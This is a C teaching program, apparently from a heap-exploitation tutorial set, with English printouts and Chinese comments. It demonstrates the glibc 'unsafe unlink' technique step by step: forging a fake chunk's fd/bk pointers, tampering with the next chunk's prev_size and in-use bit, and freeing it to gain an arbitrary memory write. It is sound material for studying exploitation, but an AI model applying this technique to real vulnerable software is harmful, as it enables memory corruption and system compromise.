#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

//*此技术不存在版本限制条件，可以在目前任意glibc版本中使用
//*各个版本对于分配chunk的size要求不一致，需要根据版本避开fastbin chunk和tcache的size范围

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 14.04/16.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

//fake chunk伪造过程
	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	//!修改fd与bk指针来使得运行unlink宏时chunk0_ptr指针能指向自身存放地址的前方，同时绕过检测
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
//修改fake chunk空间上相邻的后方chunk的相关域
//!此处要求能控制后方chunk的prev_size域与prev_inuse bit以便通过unlink时对prev chunk的检测
	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;
//执行unlink流程
	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);
	//!unlink过程中，由于fake chunk位于chunk1的前方，会触发fake_chunk->fd->bk = fake_chunk->bk; fake_chunk->bk->fd = fake_chunk->fd
	//!由于fake_chunk->fd->bk与fake_chunk->bk->fd指向同一个指向fake_chunk的指针chunk0_ptr，则chunk0_ptr会被修改为fake_chunk->fd指向的地址即 &chunk0_ptr-SIZE_SZ*3
	//!而此时用户仍然可以使用chunk0_ptr并修改其指向空间&chunk0_ptr-SIZE_SZ*3之后的内容，故可对chunk0_ptr进行人为修改使其指向任何地址，即修改当前chunk0_ptr + 3 * SIZE_SZ处的数据
	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	//put the address of the memory to edit into chunk0_ptr + 3 * SIZE_SZ
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;
	//!此时chunk0_ptr已经指向了目标地址，可直接通过此指针对目标地址上数据进行修改
	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	//*使用此种技巧，需要chunk0_ptr指向存放 &chunk0_ptr 前不远处以至于能够修改chunk_ptr指向地址时才能实现任意地址读写
	//*故一次构造仅能更改一处数据
	assert(*(long *)victim_string == 0x4141414142424242L);
}


